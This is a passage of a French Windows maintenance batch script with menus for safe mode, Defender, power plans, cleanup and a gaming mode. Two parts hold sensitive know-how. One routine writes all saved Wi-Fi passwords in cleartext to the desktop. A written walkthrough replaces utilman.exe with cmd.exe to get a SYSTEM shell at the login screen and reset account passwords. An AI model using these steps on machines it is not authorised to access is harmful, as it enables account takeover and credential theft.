timeout /t 5 /nobreak >nul
shutdown /r /t 0 & exit

:winre_status
cls
echo.
echo  ================================================
echo   STATUT WINRE ET PARAMETRES BCDEDIT
echo  ================================================
echo.
reagentc /info
echo.
echo  --- Parametres de demarrage actifs (bcdedit) ---
bcdedit /enum {current} | findstr /i "safeboot nointegritychecks safebootalternate bootmenupolicy"
echo.
pause
goto sys_winre

:winre_reset
cls
echo.
echo  ================================================
echo   REINITIALISATION DES PARAMETRES DE DEMARRAGE
echo  ================================================
echo.
echo  Suppression des flags appliques (safeboot, nosign...)
bcdedit /deletevalue {current} safeboot >nul 2>&1
bcdedit /deletevalue {current} safebootalternateshell >nul 2>&1
bcdedit /deletevalue {current} nointegritychecks >nul 2>&1
bcdedit /set {bootmgr} displaybootmenu no >nul 2>&1
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "SafeModeRevert" /f >nul 2>&1
echo  [OK] Tous les parametres de demarrage ont ete reinitialises.
echo  [OK] RunOnce nettoye.
echo.
pause
goto sys_winre


REM ===================================================================
REM              EXPORT WI-FI + LOGICIELS (COMBO TXT BUREAU)
REM ===================================================================
:sys_export_wifi_apps
cls
echo ================================================
echo   EXPORT Wi-Fi + Logiciels - Fichiers TXT Bureau
echo ================================================
echo.
echo  [1/2] Export de la liste des logiciels...
echo.
powershell -NoProfile -ExecutionPolicy Bypass -Command "$f='%USERPROFILE%\Desktop\Logiciels_Installes.txt'; $p=@('HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*','HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*','HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*'); $apps=($p | ForEach-Object { Get-ItemProperty $_ -EA SilentlyContinue } | Where-Object { $_.DisplayName } | Sort-Object DisplayName | Select-Object DisplayName,DisplayVersion,Publisher -Unique); $nl=[Environment]::NewLine; $sep=New-Object string '=',60; $h='LOGICIELS INSTALLES - '+(Get-Date -Format 'dd/MM/yyyy HH:mm')+$nl+'Ordinateur : '+$env:COMPUTERNAME+$nl+'Total      : '+$apps.Count+' logiciels'+$nl+$sep; $h | Out-File $f -Encoding UTF8; $apps | ForEach-Object { '[+] '+$_.DisplayName+' v'+$_.DisplayVersion+' | '+$_.Publisher } | Out-File $f -Encoding UTF8 -Append; Write-Host ('  [OK] '+$apps.Count+' logiciels exportes.') -f Green"
echo.
echo  [2/2] Export des mots de passe Wi-Fi...
echo.
set "FWIFI=%USERPROFILE%\Desktop\Mots_de_passe_WiFi.txt"
> "%FWIFI%" echo Mots de passe Wi-Fi - %date% %time%
>> "%FWIFI%" echo Ordinateur : %COMPUTERNAME%
>> "%FWIFI%" echo ============================================================
setlocal enabledelayedexpansion
set "wifi_found=0"
for /f "tokens=2 delims=:" %%I in ('netsh wlan show profiles ^| findstr /C:"Profil Tous" /C:"All User Profile"') do (
    set "ssid=%%I"
    set "ssid=!ssid:~1!"
    if not "!ssid!"=="" (
        set "wifi_found=1"
        set "pwd="
        for /f "tokens=2 delims=:" %%K in ('netsh wlan show profile name^="!ssid!" key^=clear ^| findstr /C:"Contenu de la cl" /C:"Key Content"') do (
            set "pwd=%%K"
        )
        set "pwd=!pwd:~1!"
        if "!pwd!"=="" set "pwd=(Aucun / Reseau ouvert)"
        >> "%FWIFI%" echo [+] SSID : !ssid!
        >> "%FWIFI%" echo     MDP  : !pwd!
        >> "%FWIFI%" echo.
        echo  [+] !ssid!
    )
)
endlocal
echo.
echo ================================================
if exist "%USERPROFILE%\Desktop\Logiciels_Installes.txt" echo  [OK] Logiciels_Installes.txt cree sur le Bureau
if exist "%USERPROFILE%\Desktop\Mots_de_passe_WiFi.txt"  echo  [OK] Mots_de_passe_WiFi.txt  cree sur le Bureau
echo ================================================
echo.
pause
goto sys_export_menu

REM ===================================================================
REM              MODE SANS ECHEC (TOGGLE) - CORRIGE
REM ===================================================================
:sys_safemode
cls
REM === Supprimer RunOnce EN PREMIER pour eviter toute boucle ===
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "SafeModeRevert" /f >nul 2>&1

if not defined SAFEBOOT_OPTION goto safemode_config

REM =====================================================
REM  ON EST EN MODE SANS ECHEC -> MENU RETOUR
REM =====================================================
color 0E
set "opts=Revenir en mode NORMAL~Restaurer le demarrage standard et redemarrer le PC;Quitter~Rester en mode sans echec et fermer ce script"
call :DynamicMenu "MODE SANS ECHEC ACTIF - Type: %SAFEBOOT_OPTION%" "%opts%"
set "sm_res=%errorlevel%"

if "%sm_res%"=="0" (
    echo.
    echo  Pour revenir en mode normal plus tard, relancez ce script.
    pause
    exit
)
if "%sm_res%"=="1" goto safemode_revert
if "%sm_res%"=="2" (
    echo.
    echo  Pour revenir en mode normal plus tard, relancez ce script.
    pause
    exit
)
goto sys_safemode

:safemode_revert
cls
echo.
echo  [1/2] Suppression de la config mode sans echec...
bcdedit /deletevalue {current} safeboot >nul 2>&1
if %errorlevel%==0 (
    echo  [OK] Mode normal restaure.
) else (
    echo  [INFO] Deja en mode normal ou erreur bcdedit.
)
echo  [2/2] Redemarrage dans 5 secondes...
echo.
echo  ================================================
echo  [OK] Le PC va redemarrer NORMALEMENT.
echo  ================================================
timeout /t 5 /nobreak >nul
shutdown /r /t 0
exit

REM =====================================================
REM  ON EST EN MODE NORMAL -> ACTIVATION SAFE MODE
REM =====================================================
:safemode_config
color 0B
set "opts=Mode Minimal~Pilotes de base uniquement - le plus stable;Avec Reseau~Acces internet disponible (Wi-Fi ou Ethernet)"
call :DynamicMenu "MODE SANS ECHEC - Choisissez le type de demarrage" "%opts%"
set "sm_cfg=%errorlevel%"

if "%sm_cfg%"=="0" goto system_tools
if "%sm_cfg%"=="1" set "SM_TYPE=minimal"
if "%sm_cfg%"=="2" set "SM_TYPE=network"
if not defined SM_TYPE goto safemode_config

cls
echo.
echo  [1/3] Configuration bcdedit (%SM_TYPE%)...
bcdedit /set {current} safeboot %SM_TYPE% >nul 2>&1
if %errorlevel% neq 0 (
    echo  [ERREUR] bcdedit a echoue. Droits insuffisants ?
    pause
    goto system_tools
)
echo  [OK] Mode sans echec (%SM_TYPE%) programme.

echo  [2/3] Inscription RunOnce pour restauration automatique...
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "SafeModeRevert" /t REG_SZ /d "\"%~f0\"" /f >nul 2>&1
echo  [OK] Script inscrit au demarrage automatique.

echo  [3/3] Redemarrage dans 5 secondes...
echo.
echo  ================================================
echo  APRES LE REDEMARRAGE :
echo  - Windows demarrera en MODE SANS ECHEC
echo  - Ce script se relancera automatiquement
echo  - Selectionnez "Revenir en mode NORMAL"
echo  ================================================
timeout /t 5 /nobreak >nul
shutdown /r /t 0
exit


REM ===================================================================
REM                    SORTIE DU SCRIPT
REM ===================================================================
:exit_script
cls
echo ======================================================
echo     MERCI D'AVOIR UTILISE CET OUTIL !
echo ======================================================
echo.
echo Developpe par ALEEXLEDEV
echo.
echo Appuyez sur une touche pour quitter...
pause >nul
exit

:InputWithEsc
set "%~2="
if exist "%TEMP%\in.txt" del "%TEMP%\in.txt"
set "ps_in=$Host.UI.RawUI.FlushInputBuffer(); [Console]::Write('%~1'); $s=''; while($true) { if ($Host.UI.RawUI.KeyAvailable) { $k=$Host.UI.RawUI.ReadKey('IncludeKeyDown,NoEcho'); $vc=$k.VirtualKeyCode; if ($vc -eq 27) { [Console]::WriteLine(); exit 1 }; if ($vc -eq 13) { [Console]::WriteLine(); Set-Content -Path '%TEMP%\in.txt' -Value $s -Encoding ASCII; exit 0 }; if ($vc -eq 8) { if ($s.Length -gt 0) { $s=$s.Substring(0,$s.Length-1); [Console]::Write(([char]8).ToString()+' '+([char]8).ToString()) } } elseif ($vc -eq 86 -and ($k.ControlKeyState -match 'LeftCtrlPressed|RightCtrlPressed')) { $cb=[Windows.Clipboard]::GetText(); if ($cb) { $s+=$cb; [Console]::Write($cb) } } else { $c=$k.Character; $ci=[int][char]$c; if ($ci -ge 32 -and $ci -le 126 -or $ci -gt 127) { $s+=$c; [Console]::Write($c) } } } Start-Sleep -Milliseconds 10 }"
powershell -NoProfile -ExecutionPolicy Bypass -Command "%ps_in%"
if errorlevel 1 exit /b 1
if exist "%TEMP%\in.txt" (
    set /p "%~2=" < "%TEMP%\in.txt"
    del "%TEMP%\in.txt"
)
exit /b 0

:DynamicMenu
:: Arguments: %1="Titre", %2="Option1;Option2;Option3", %3="OptionFlags" (ex: NONUMS)
:: Retourne: ERRORLEVEL (1, 2, 3...) ou 0 pour Echap/Retour
setlocal
set "m_title=%~1"
set "m_opts=%~2"
set "m_flags=%~3"

set "ps_code=$o=($env:m_opts -split ';');$t=$env:m_title;$fl=$env:m_flags;$sel=@();for($i=0;$i -lt $o.Count;$i++){if($o[$i] -notmatch '^\[---'){$sel+=$i}};$sIdx=0;$pad=115;try{if([console]::WindowWidth -gt 5){$pad=[math]::Min([console]::WindowWidth-5, 115)}}catch{};$maxV=50;try{if([console]::WindowHeight -gt 0){$maxV=[math]::Max([console]::WindowHeight-10, 10)}}catch{};$topI=0;if($fl -notmatch 'NOCLS'){clear-host;try{$cY=[console]::WindowTop}catch{$cY=0}}else{try{$cY=[console]::CursorTop}catch{$cY=0}};function D{ try{[console]::SetCursorPosition(0,$cY)}catch{};write-host '  ========================================================================================' -f Cyan;write-host ('   ' + $t) -f White;write-host '  ========================================================================================' -f Cyan;write-host (' '.PadRight($pad));$num=1;$printed=0;for($i=0;$i -lt $o.Count;$i++){$parts=$o[$i]-split'~';$s=$parts[0];$d='';if($parts.Count -gt 1){$d=$parts[1]};$isH=($s -match '^\[---');if(-not $isH){$cNum=$num;$num++};if($i -lt $topI -or $printed -ge $maxV){continue};if($isH){write-host (' '.PadRight($pad));$printed++;if($printed -lt $maxV){write-host ('       ' + $s).PadRight($pad) -f Cyan;$printed++}}else{$f_str='    ';if($s -match '^\(F\) '){$f_str='(F) ';$s=$s.Substring(4)};if($i -eq $sel[$sIdx]){$str='{0}>> [{1}] {2}  ' -f $f_str, $cNum, $s; write-host $str -NoNewline -f Black -b White; $rem=$pad-$str.Length; if($rem -lt 0){$rem=0}; $ds=if($d){'   - '+$d}else{''}; if($ds.Length -gt $rem){$ds=$ds.Substring(0,$rem)}; write-host $ds.PadRight($rem) -f Yellow}else{$str='{0}   [{1}] {2}  ' -f $f_str, $cNum, $s; write-host $str.PadRight($pad) -f Gray};$printed++}};while($printed -lt $maxV){write-host (' '.PadRight($pad));$printed++};write-host (' '.PadRight($pad));write-host '  ----------------------------------------------------------------------------------------' -f Cyan;$show_help='   [FLECHES] Naviguer | [ENTREE] Valider | [F] Favoriser | [S] Rechercher | [0/ECHAP] Retour';if($fl -match 'NONUMS'){$show_help='   [FLECHES] Naviguer | [ENTREE] Valider | [ECHAP] Retour'};write-host $show_help -NoNewline -f DarkGray};while($true){$target=$sel[$sIdx];if($target -lt $topI){$topI=$target};$lines=0;for($i=$topI;$i -le $target;$i++){if($o[$i] -match '^\[---'){$lines+=2}else{$lines+=1}};while($lines -gt $maxV){if($o[$topI] -match '^\[---'){$lines-=2}else{$lines-=1};$topI++};D;$k=$Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown');$v=$k.VirtualKeyCode;if($v -eq 38){$sIdx--;if($sIdx -lt 0){$sIdx=$sel.Count-1}}elseif($v -eq 40){$sIdx++;if($sIdx -ge $sel.Count){$sIdx=0}}elseif($v -eq 13){if($fl -notmatch 'NOCLS'){clear-host};exit ($sIdx+1)}elseif($v -eq 27 -or ($fl -notmatch 'NONUMS' -and $k.Character -eq '0')){if($fl -notmatch 'NOCLS'){clear-host};exit 0}elseif($fl -notmatch 'NONUMS' -and $v -eq 70){if($fl -notmatch 'NOCLS'){clear-host};exit (200+$sIdx+1)}elseif($fl -notmatch 'NONUMS' -and ($k.Character -eq 'S' -or $k.Character -eq 's')){if($fl -notmatch 'NOCLS'){clear-host};exit 299}elseif($fl -notmatch 'NONUMS' -and [string]$k.Character -match '^[1-9]$' -and [int][string]$k.Character -le $sel.Count){if($fl -notmatch 'NOCLS'){clear-host};exit ([int][string]$k.Character)}}"

powershell -NoProfile -ExecutionPolicy Bypass -Command "%ps_code%"
set "res=%errorlevel%"
exit /b %res%


:sys_unlock_notes
cls
echo ===============================================
echo   NOTE: Debloquer une session Windows (WinRE)
echo ===============================================
echo.
echo 1^) Demarrer sur une cle USB Windows ^(WinRE/WinPE^) puis ouvrir l'invite de commande.
echo.
echo 2^) Identifier la lettre du disque contenant Windows:
echo    ^> diskpart
echo    ^> list volume
echo    Reperer le volume ou se trouve le dossier \Windows ^(ex: Z:^)
echo.
echo    S'il n'y en a pas ^(pas de lettre sur le volume Windows^):
echo    ^> select volume X
echo    ^> assign letter=Z
echo    ^> exit
echo.
echo 3^) Verifier la presence des fichiers cibles:
echo    ^> dir Z:\windows\system32\cmd.exe
echo    ^> dir Z:\windows\system32\utilman.exe
echo.
echo 4^) Remplacer utilman.exe par cmd.exe ^(sauvegarder si besoin avant^):
echo    ^(Optionnel^) Sauvegarde:
echo    ^> copy Z:\windows\system32\utilman.exe Z:\windows\system32\utilman.exe.bak
echo    Remplacement:
echo    ^> copy Z:\windows\system32\cmd.exe Z:\windows\system32\utilman.exe
echo    Tapez O ^(Oui^) si demande pour remplacer.
echo.
echo 5^) Redemarrer le PC normalement.
echo.
echo 6^) A l'ecran de connexion, cliquer sur le bouton "Ergonomie" ^(facilites d'acces^):
echo    Une fenetre CMD s'ouvre avec privileges systeme.
echo.
echo 7^) Changer le mot de passe du compte desire:
echo    ^> net user nom_utilisateur nouveau_motdepasse
echo    Exemple:
echo    ^> net user martin 123456
echo.
echo 8^) ^(Recommande^) Restaurer utilman.exe d'origine apres recuperation:
echo    ^> copy Z:\windows\system32\utilman.exe.bak Z:\windows\system32\utilman.exe
echo.
echo 9^) Securite:
echo    - N'effectuer ces operations que si vous etes autorise.
echo    - Supprimer la sauvegarde .bak et activer des protections ^(BitLocker, etc.^).
echo.
pause
goto system_tools

REM ===================================================================
REM              GESTIONNAIRE WINDOWS DEFENDER
REM ===================================================================
:sys_defender
cls
set "opts=Scan Rapide~Analyse zones critiques (2-5 min);Scan Complet~Analyse tout le disque (peut durer 1h+);Mettre a jour les Signatures~Telecharger les dernieres definitions virus;Voir les Menaces Detectees~Liste des virus et malwares trouves sur ce PC;Statut Protection en Temps Reel~Affiche l etat complet de la protection Defender"
call :DynamicMenu "GESTIONNAIRE WINDOWS DEFENDER" "%opts%"
set "wd_c=%errorlevel%"
if "%wd_c%"=="0" goto system_tools
if "%wd_c%"=="1" goto wd_quick
if "%wd_c%"=="2" goto wd_full
if "%wd_c%"=="3" goto wd_update
if "%wd_c%"=="4" goto wd_threats
if "%wd_c%"=="5" goto wd_status
goto sys_defender

:wd_quick
cls
echo.
echo  [DEFENDER] Lancement du scan rapide...
echo  Appuyez sur Ctrl+C pour interrompre.
echo.
"%ProgramFiles%\Windows Defender\MpCmdRun.exe" -Scan -ScanType 1
echo.
echo  [OK] Scan rapide termine.
pause & goto sys_defender

:wd_full
cls
echo.
echo  [DEFENDER] Lancement du scan COMPLET...
echo  Cela peut prendre 30min a 2h selon le disque.
echo  Appuyez sur Ctrl+C pour interrompre.
echo.
"%ProgramFiles%\Windows Defender\MpCmdRun.exe" -Scan -ScanType 2
echo.
echo  [OK] Scan complet termine.
pause & goto sys_defender

:wd_update
cls
echo.
echo  [DEFENDER] Mise a jour des signatures en cours...
echo.
"%ProgramFiles%\Windows Defender\MpCmdRun.exe" -SignatureUpdate
echo.
echo  [OK] Signatures mises a jour.
pause & goto sys_defender

:wd_threats
cls
echo.
echo  ================================================
echo   MENACES DETECTEES (historique)
echo  ================================================
echo.
powershell -NoProfile -Command "$t=Get-MpThreatDetection -EA SilentlyContinue; if(-not $t){Write-Host '  [OK] Aucune menace detectee !' -f Green}else{$t | Select-Object @{N='Date';E={$_.InitialDetectionTime.ToString('dd/MM HH:mm')}},@{N='Menace';E={(Get-MpThreat -ThreatID $_.ThreatID -EA SilentlyContinue).ThreatName}},@{N='Statut';E={if($_.ActionSuccess){'Neutralisee'}else{'ACTIVE'}}} | Format-Table -AutoSize | Out-String | Write-Host}"
echo.
pause & goto sys_defender

:wd_status
cls
echo.
echo  ================================================
echo   STATUT WINDOWS DEFENDER
echo  ================================================
echo.
powershell -NoProfile -Command "Get-MpComputerStatus -EA SilentlyContinue | Select-Object @{N='Protection TR';E={$_.RealTimeProtectionEnabled}},@{N='Antivirus';E={$_.AntivirusEnabled}},@{N='Antispyware';E={$_.AntispywareEnabled}},@{N='Version Def.';E={$_.AntispywareSignatureVersion}},@{N='Derniere MAJ';E={$_.AntispywareSignatureLastUpdated.ToString('dd/MM/yyyy HH:mm')}} | Format-List | Out-String | Write-Host"
echo.
pause & goto sys_defender

REM ===================================================================
REM              PLAN D'ALIMENTATION
REM ===================================================================
:sys_power_plan
cls
set "opts=Mode Equilibre (Defaut)~Recommande pour usage quotidien (batterie + perf);Mode Economies d'Energie~Reduit les performances pour maximiser l'autonomie;Mode Performances Elevees~Priorite aux performances, consommation accrue;Mode Ultimate Performance (Cache)~Mode Windows cache - eliminines les micro-latences, ideal gaming/pro;Voir le Plan Actif~Affiche quel plan d'alimentation est actuellement actif;Lister tous les Plans~Voir tous les plans disponibles sur ce PC"
call :DynamicMenu "GESTIONNAIRE PLAN D'ALIMENTATION" "%opts%"
set "pp_c=%errorlevel%"
if "%pp_c%"=="0" goto system_tools
if "%pp_c%"=="1" goto pp_balanced
if "%pp_c%"=="2" goto pp_saver
if "%pp_c%"=="3" goto pp_high
if "%pp_c%"=="4" goto pp_ultimate
if "%pp_c%"=="5" goto pp_current
if "%pp_c%"=="6" goto pp_list
goto sys_power_plan

:pp_balanced
powercfg /setactive 381b4222-f694-41f0-9685-ff5bb260df2e >nul 2>&1
echo  [OK] Plan Equilibre active.
timeout /t 2 /nobreak >nul & goto sys_power_plan

:pp_saver
powercfg /setactive a1841308-3541-4fab-bc81-f71556f20b4a >nul 2>&1
echo  [OK] Plan Economies d'Energie active.
timeout /t 2 /nobreak >nul & goto sys_power_plan

:pp_high
powercfg /setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c >nul 2>&1
echo  [OK] Plan Performances Elevees active.
timeout /t 2 /nobreak >nul & goto sys_power_plan

:pp_ultimate
cls
echo.
echo  ================================================
echo   ACTIVATION ULTIMATE PERFORMANCE (mode cache)
echo  ================================================
echo.
echo  Ce plan elimine les micro-latences et desactive
echo  les mecanismes d'economie d'energie.
echo  Ideal pour : Gaming, Creation, Workstation Pro.
echo.
echo  [1/2] Creation du plan (si absent)...
powercfg -duplicatescheme e9a42b02-d5df-448d-aa00-03f14749eb61 >nul 2>&1
echo  [2/2] Activation du plan Ultimate Performance...
for /f "tokens=4" %%G in ('powercfg /list ^| findstr /i "ultimate\|performances optimales"') do (
    powercfg /setactive %%G >nul 2>&1
)
echo.
echo  [OK] Mode Ultimate Performance ACTIVE !
echo  Visible dans : Parametres > Alimentation et veille > Parametres d'alimentation supplementaires
echo.
pause & goto sys_power_plan

:pp_current
cls
echo.
echo  Plan d'alimentation actif :
powercfg /getactivescheme
echo.
pause & goto sys_power_plan

:pp_list
cls
echo.
echo  Plans d'alimentation disponibles :
powercfg /list
echo.
pause & goto sys_power_plan

REM ===================================================================
REM              MENU DE NETTOYAGE ET OPTIMISATION
REM ===================================================================
:sys_opti_menu
cls
set "opts=[--- NETTOYAGE ET MAINTENANCE ---]"
set "opts=%opts%;Nettoyage Complet Unifie~Ouvre le panneau de nettoyage complet (Disque, Temp, WU, DNS...)"
set "opts=%opts%;Nettoyage du Registre~Optimisation rapide et suppression des entrees mortes"
set "opts=%opts%;[--- OPTIMISATION SYSTEME ---]"
set "opts=%opts%;Menu Optimisation Windows 11~Bloatwares, Telemetrie, Performances, Cortana"
set "opts=%opts%;Programmes au Demarrage~Lister et desactiver les logiciels qui demarrent avec Windows"

call :DynamicMenu "MENU NETTOYAGE ET OPTIMISATION" "%opts%"
set "opti_choice=%errorlevel%"

if "%opti_choice%"=="1" goto sys_clean_unified
if "%opti_choice%"=="2" goto sys_registry_cleanup
if "%opti_choice%"=="3" goto sys_tweaks_menu
if "%opti_choice%"=="4" goto sys_startup_manager
if "%opti_choice%"=="0" goto system_tools

if %opti_choice% GEQ 200 (
    set /a "toggle_idx=%opti_choice%-200"
    if "!toggle_idx!"=="1" call :ToggleFav "sys_clean_unified"
    if "!toggle_idx!"=="2" call :ToggleFav "sys_registry_cleanup"
    if "!toggle_idx!"=="3" call :ToggleFav "sys_tweaks_menu"
    if "!toggle_idx!"=="4" call :ToggleFav "sys_startup_manager"
)
goto sys_opti_menu

REM ===================================================================
REM              NETTOYAGE COMPLET UNIFIE
REM ===================================================================
:sys_clean_unified
cls
set "opts=Fichiers Temporaires et Cache~Supprime temp Windows, prefetch et cache navigateurs;Nettoyage Windows Update~Supprime les anciens fichiers WU (libere souvent 5-20 Go);Cache DNS~Vide le cache de resolution DNS local;Nettoyage Disque (cleanmgr)~Utilitaire Windows classique de nettoyage;Registre Windows~Nettoie les entrees mortes / obsoletes;Presse-papiers~Purge le contenu du presse-papiers (securite apres copie de mdp);[TOUT EN UN] Nettoyage Complet~Execute tous les nettoyages ci-dessus en sequence"
call :DynamicMenu "NETTOYAGE COMPLET UNIFIE" "%opts%"
set "cl_c=%errorlevel%"
if "%cl_c%"=="0" goto sys_opti_menu
if "%cl_c%"=="1" goto cl_temp
if "%cl_c%"=="2" goto cl_wu
if "%cl_c%"=="3" goto cl_dns
if "%cl_c%"=="4" goto cl_disk
if "%cl_c%"=="5" goto cl_registry
if "%cl_c%"=="6" goto cl_clipboard
if "%cl_c%"=="7" goto cl_all
goto sys_clean_unified

:cl_temp
cls
echo.
echo  [TEMP] Suppression des fichiers temporaires...
del /f /s /q "%temp%\*.*" >nul 2>&1
del /f /s /q "C:\Windows\Temp\*.*" >nul 2>&1
del /f /s /q "C:\Windows\Prefetch\*.*" >nul 2>&1
echo  [CACHE CHROME]...
for /d %%D in ("%LOCALAPPDATA%\Google\Chrome\User Data\*") do (
    if exist "%%D\Cache" rd /s /q "%%D\Cache" >nul 2>&1
)
echo  [CACHE EDGE]...
for /d %%D in ("%LOCALAPPDATA%\Microsoft\Edge\User Data\*") do (
    if exist "%%D\Cache" rd /s /q "%%D\Cache" >nul 2>&1
)
echo  [OK] Fichiers temporaires supprimes.
pause & goto sys_clean_unified

:cl_wu
cls
echo.
echo  [WU] Nettoyage Windows Update en cours...
echo  [1/4] Arret des services...
net stop wuauserv >nul 2>&1
net stop bits >nul 2>&1
echo  [2/4] Suppression du cache SoftwareDistribution...
rd /s /q "C:\Windows\SoftwareDistribution\Download" >nul 2>&1
mkdir "C:\Windows\SoftwareDistribution\Download" >nul 2>&1
echo  [3/4] Nettoyage composants DISM...
DISM /online /Cleanup-Image /StartComponentCleanup >nul 2>&1
echo  [4/4] Redemarrage des services...
net start wuauserv >nul 2>&1
net start bits >nul 2>&1
echo.
echo  [OK] Nettoyage Windows Update termine.
pause & goto sys_clean_unified

:cl_dns
ipconfig /flushdns
echo  [OK] Cache DNS vide.
timeout /t 2 /nobreak >nul & goto sys_clean_unified

:cl_disk
cleanmgr /sageset:65535
cleanmgr /sagerun:65535
goto sys_clean_unified

:cl_registry
cls
echo.
echo  [REGISTRE] Nettoyage en cours...
reg delete "HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\BagMRU" /f >nul 2>&1
reg delete "HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\Bags" /f >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" /f >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /f >nul 2>&1
echo  [OK] Entrees de registre obsoletes supprimees.
pause & goto sys_clean_unified

:cl_all
cls
echo.
echo  ================================================
echo   NETTOYAGE COMPLET EN COURS...
echo  ================================================
echo.
echo  [1/5] Fichiers temporaires et cache...
del /f /s /q "%temp%\*.*" >nul 2>&1
del /f /s /q "C:\Windows\Temp\*.*" >nul 2>&1
del /f /s /q "C:\Windows\Prefetch\*.*" >nul 2>&1
for /d %%D in ("%LOCALAPPDATA%\Google\Chrome\User Data\*") do if exist "%%D\Cache" rd /s /q "%%D\Cache" >nul 2>&1
for /d %%D in ("%LOCALAPPDATA%\Microsoft\Edge\User Data\*") do if exist "%%D\Cache" rd /s /q "%%D\Cache" >nul 2>&1
echo  [OK]
echo  [2/5] Windows Update cache...
net stop wuauserv >nul 2>&1 & net stop bits >nul 2>&1
rd /s /q "C:\Windows\SoftwareDistribution\Download" >nul 2>&1
mkdir "C:\Windows\SoftwareDistribution\Download" >nul 2>&1
DISM /online /Cleanup-Image /StartComponentCleanup >nul 2>&1
net start wuauserv >nul 2>&1 & net start bits >nul 2>&1
echo  [OK]
echo  [3/5] Cache DNS...
ipconfig /flushdns >nul 2>&1
echo  [OK]
echo  [4/5] Registre...
reg delete "HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\BagMRU" /f >nul 2>&1
reg delete "HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\Bags" /f >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" /f >nul 2>&1
echo  [OK]
echo  [5/5] Nettoyage Disque Windows...
echo.
echo  ================================================
echo  [OK] Nettoyage complet termine !
echo  Lancement de cleanmgr pour finaliser...
echo  ================================================
echo.
start cleanmgr /sageset:65535
timeout /t 3 /nobreak >nul
cleanmgr /sagerun:65535
goto sys_clean_unified

:cl_clipboard
cls
echo.
echo  [PRESSE-PAPIERS] Vidage complet en cours...
powershell -NoProfile -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Clipboard]::Clear()"
echo off | clip >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Experience" /v "ClipboardHistory" /f >nul 2>&1
powershell -NoProfile -Command "Get-Process -Name 'TextInputHost' -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue"
echo  [OK] Presse-papiers et historique entierement vides.
timeout /t 2 /nobreak >nul & goto sys_clean_unified

REM ===================================================================
REM              POINT DE RESTAURATION SYSTEME
REM ===================================================================
:res_restore_point
cls
echo.
echo  ================================================
echo   CREATION D'UN POINT DE RESTAURATION SYSTEME
echo  ================================================
echo.
echo  Activation de la protection systeme si desactivee...
powershell -NoProfile -Command "Enable-ComputerRestore -Drive 'C:\' -ErrorAction SilentlyContinue" >nul 2>&1
echo.
echo  Creation du point de restauration en cours...
echo  (Cela peut prendre 30 a 60 secondes)
echo.
powershell -NoProfile -ExecutionPolicy Bypass -Command "$d = Get-Date -Format 'dd/MM/yyyy HH:mm'; Checkpoint-Computer -Description ('AleexScripts - ' + $d) -RestorePointType 'MODIFY_SETTINGS'; Write-Host '  [OK] Point de restauration cree avec succes !' -ForegroundColor Green"
if %errorlevel% neq 0 (
    echo  [ERREUR] Impossible de creer le point de restauration.
    echo  Verifiez que la protection systeme est activee sur C: dans les
    echo  Proprietes systeme ^> Protection du systeme.
)
echo.
pause
goto sys_rescue_menu

REM ===================================================================
REM              MODE GAMING - BOOST PERFORMANCES
REM ===================================================================
:sys_gaming_mode
cls
set "opts=ACTIVER le Mode Gaming~Desactive les services lourds pour maximiser les FPS;DESACTIVER le Mode Gaming~Reactiver tous les services normaux (retour Windows standard)"
call :DynamicMenu "MODE GAMING - BOOST PERFORMANCES" "%opts%"
set "gm_c=%errorlevel%"
if "%gm_c%"=="0" goto menu_principal
if "%gm_c%"=="1" goto gm_enable
if "%gm_c%"=="2" goto gm_disable
goto sys_gaming_mode

:gm_enable
cls
echo.
echo  ================================================
echo   MODE GAMING - ACTIVATION
echo  ================================================
echo.
echo  [1/6] Arret Windows Update (wuauserv)...
net stop wuauserv >nul 2>&1
echo  [2/6] Arret Indexation des fichiers (WSearch)...
net stop WSearch >nul 2>&1
echo  [3/6] Arret Superfetch / SysMain...
net stop SysMain >nul 2>&1
echo  [4/6] Arret Spooler d'impression (Spooler)...
net stop Spooler >nul 2>&1
echo  [5/6] Arret Connected User Experiences (DiagTrack)...
net stop DiagTrack >nul 2>&1
echo  [6/6] Activation du plan Performances Elevees...
powercfg /setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c >nul 2>&1
echo.
echo  ================================================
echo   [OK] MODE GAMING ACTIVE !
echo   Tous les services lourds ont ete stoppes.
echo   Les performances CPU/GPU sont maximisees.
echo.
echo   ATTENTION : Relancez ce menu pour DESACTIVER
echo   le mode Gaming quand vous avez fini de jouer.
echo  ================================================
echo.
pause
goto sys_gaming_mode

:gm_disable
cls
echo.
echo  ================================================
echo   MODE GAMING - DESACTIVATION
echo  ================================================
echo.
echo  [1/6] Redemarrage Windows Update (wuauserv)...
net start wuauserv >nul 2>&1
echo  [2/6] Redemarrage Indexation des fichiers (WSearch)...
net start WSearch >nul 2>&1
echo  [3/6] Redemarrage Superfetch / SysMain...
net start SysMain >nul 2>&1
echo  [4/6] Redemarrage Spooler d'impression...
net start Spooler >nul 2>&1
echo  [5/6] Redemarrage DiagTrack...
net start DiagTrack >nul 2>&1
echo  [6/6] Retour au plan d'alimentation Equilibre...
powercfg /setactive 381b4222-f694-41f0-9685-ff5bb260df2e >nul 2>&1
echo.
echo  ================================================
echo   [OK] MODE GAMING DESACTIVE !
echo   Tous les services ont ete restaures normalement.
echo  ================================================
echo.
pause
goto sys_gaming_mode

REM ===================================================================
REM              RAPPORT COMPLET TOUT-EN-UN (HTML)
REM ===================================================================
:sys_full_report
cls
echo.
echo  ================================================
